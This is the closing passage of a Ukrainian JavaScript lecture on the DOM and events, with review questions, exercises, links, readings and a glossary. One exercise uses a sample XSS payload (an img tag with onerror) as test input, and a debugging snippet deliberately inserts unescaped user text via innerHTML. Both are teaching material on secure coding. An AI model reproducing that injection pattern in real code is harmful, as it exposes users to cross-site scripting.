4. У чому різниця між `textContent`, `innerText` та `innerHTML`?
5. Чому `input.value` і `input.getAttribute('value')` можуть відрізнятися?
6. Назвіть три фази поширення події. Чим `target` відрізняється від
   `currentTarget`?
7. Поясніть делегування подій і три його переваги.
8. Чому `removeEventListener` не спрацює з `() => doSomething()`?
9. Що робить `AbortController` у контексті обробників подій?
10. Чому при перетягуванні слухають `document`, а не сам елемент?
11. Навіщо потрібен `setPointerCapture`?
12. Чому `transform` кращий за `left`/`top` для перетягування?
13. Що станеться, якщо не задати `touch-action: none`?
14. Чому `event.code` надійніший за `event.key` для гарячих клавіш?
15. Чому `innerHTML` небезпечний, навіть якщо `<script>` через нього не
    виконується?
16. Що дає `contenteditable="plaintext-only"` порівняно з `"true"`?
17. Чому стан застосунку не варто зберігати лише в DOM?

---

## 19. Практичні вправи

**Вправа 1 (пошук і зміна, 20 хв).** На довільній сторінці через консоль:
знайдіть усі посилання, що ведуть на зовнішні сайти, і додайте їм клас
`external`; порахуйте кількість зображень без `alt`; змініть усі заголовки
другого рівня на верхній регістр.

**Вправа 2 (створення елементів, 25 хв).** Маючи масив об'єктів
`{ id, title, description, tags }`, згенеруйте сітку карток. Використайте
`<template>`, `DocumentFragment` і `textContent`. Переконайтеся, що назва з
текстом `<img src=x onerror=alert(1)>` відображається як звичайний текст.

**Вправа 3 (делегування, 25 хв).** Реалізуйте список справ: додавання,
позначення виконаною, видалення, фільтр «усі / активні / виконані».
**Один** обробник `click` на весь список і **один** `submit` на форму.

**Вправа 4 (перетягування, 45 хв).** Реалізуйте `makeDraggable` самостійно, не
підглядаючи в розділ 11. Перевірте: швидкий рух мишею, вихід за межі дошки,
роботу на сенсорному екрані (DevTools → Device Mode), перетягування двох
елементів по черзі.

**Вправа 5 (редагування, 30 хв).** Додайте до стікера редагування на місці з
лічильником символів, який змінює колір при наближенні до ліміту 500;
`Escape` скасовує, `Ctrl+Enter` зберігає; поле автоматично росте до 320 px.

**Вправа 6 (стан, 40 хв).** Розділіть свою реалізацію на модулі `state.js`,
`storage.js`, `render.js`, `drag.js`, `main.js`. Перевірте себе:
`state.js` не повинен містити жодного звернення до `document`.

**Вправа 7 (налагодження, 20 хв).** Знайдіть чотири помилки:

```js
const notes = document.getElementsByClassName('note');
notes.map(n => n.classList.add('visible'));

document.querySelector('.board').innerHTML += `<div>${userText}</div>`;

note.addEventListener('pointerdown', () => {
  note.addEventListener('pointermove', (e) => {
    note.style.left = e.clientX + 'px';
  });
});
```

---

## 20. Корисні посилання

- [javascript.info: Document](https://uk.javascript.info/document) — розділ
  про DOM, українською.
- [javascript.info: Вступ до подій](https://uk.javascript.info/events) та
  [UI-події](https://uk.javascript.info/event-details) — найкраще пояснення
  моделі подій.
- [javascript.info: Drag'n'Drop з подіями миші](https://uk.javascript.info/mouse-drag-and-drop) —
  покроковий розбір саме нашої задачі.
- [MDN: Document Object Model](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model) —
  довідник.
- [MDN: Pointer events](https://developer.mozilla.org/en-US/docs/Web/API/Pointer_events) —
  універсальна модель вказівника.
- [MDN: Event reference](https://developer.mozilla.org/en-US/docs/Web/Events) —
  повний перелік подій.
- [MDN: Window.localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage).
- [MDN: Intersection Observer API](https://developer.mozilla.org/en-US/docs/Web/API/Intersection_Observer_API).
- [W3C ARIA APG: Modal Dialog](https://www.w3.org/WAI/ARIA/apg/patterns/dialog-modal/) —
  як зробити доступне модальне вікно (потрібно в Завданні №2).
- [DOMPurify](https://github.com/cure53/DOMPurify) — очищення HTML.
- [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

---

## 21. Література

1. **Haverbeke, M.** *Eloquent JavaScript.* 4th ed. — No Starch Press, 2024. —
   Розділи 14 «The Document Object Model», 15 «Handling Events» і 16
   («A Platform Game») — прямо до цієї лекції, з робочими прикладами.
2. **Flanagan, D.** *JavaScript: The Definitive Guide.* 7th ed. —
   O'Reilly, 2020. — Розділ 15 «JavaScript in Web Browsers»: DOM, події,
   сховище, спостерігачі.
3. **Pickering, H.** *Inclusive Components.* — Smashing Magazine, 2018. —
   Доступні модальні вікна, меню, сповіщення — саме те, що потрібно в
   Завданні №2.
4. **Firth, A.** *Practical Web Accessibility.* 2nd ed. — Apress, 2024. —
   Керування фокусом, робота з клавіатурою, ARIA-стани.

---

## 22. Глосарій

| Українською | English | Пояснення |
|---|---|---|
| Об'єктна модель документа | DOM | Деревоподібне подання документа |
| Вузол | node | Елемент дерева DOM |
| Жива колекція | live collection | Автоматично оновлюється при зміні DOM |
| Спливання | bubbling | Поширення події від цілі вгору |
| Занурення | capturing | Поширення від кореня до цілі |
| Ціль події | event target | Елемент, на якому подія сталася |
| Делегування подій | event delegation | Один обробник на предку замість багатьох |
| Дія за замовчуванням | default action | Стандартна реакція браузера на подію |
| Подія вказівника | pointer event | Уніфікована подія для миші, дотику й стилуса |
| Захоплення вказівника | pointer capture | Перенаправлення подій до одного елемента |
| Зсув захоплення | grab offset | Відстань від краю елемента до точки натискання |
| Обмеження | clamping | Утримання значення в допустимому діапазоні |
| Прибивання | debounce | Виклик лише після паузи в подіях |
| Обмеження частоти | throttle | Виклик не частіше заданого інтервалу |
| Фрагмент документа | DocumentFragment | Легкий контейнер для пакетної вставки |
| Міжсайтовий скриптинг | XSS | Впровадження чужого коду в сторінку |
| Джерело істини | source of truth | Місце, де зберігається авторитетний стан |

---

**Попередня:** [Лекція 3. JavaScript: мова, об'єкти та колекції](03-javascript-language.md)
**Наступна:** [Лекція 5. Асинхронний JavaScript та робота з мережею](05-async-javascript-network.md)

[← До змісту курсу](README.md)
